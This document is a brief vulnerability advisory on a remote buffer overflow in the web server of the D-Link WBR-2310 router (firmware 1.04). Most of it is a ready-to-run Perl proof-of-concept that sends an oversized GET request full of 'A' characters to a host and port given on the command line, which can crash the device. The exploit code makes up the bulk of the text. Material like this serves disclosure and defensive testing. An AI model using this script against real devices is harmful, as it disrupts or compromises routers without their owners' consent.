source: http://www.securityfocus.com/bid/42153/info

D-Link WBR-2310 is prone to a remote buffer-overflow vulnerability because it fails to bounds-check user-supplied input before copying it into an insufficiently sized memory buffer. This issue occurs in the device's webserver.

Exploiting this vulnerability may allow remote attackers to execute arbitrary code in the context of the affected devices webserver.

D-Link WBR-2310 firmware version 1.04 is vulnerable; other versions may also be affected. 

#!/usr/bin/perl
use IO::Socket;

        if (@ARGV < 1) {
                usage();
        }

        $ip     = $ARGV[0];
        $port   = $ARGV[1];

        print "[+] Sending request...\n";

        $socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr =>
"$ip", PeerPort => "$port") || die "[-] Connection FAILED!\n";
        print $socket "GET
/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n";

        sleep(3);
        close($socket);

        print "[+] Done!\n";

sub usage() {
        print "[-] Usage: <". $0 ."> <host> <port>\n";
        print "[-] Example: ". $0 ." 192.168.0.1 80\n";
        exit;
}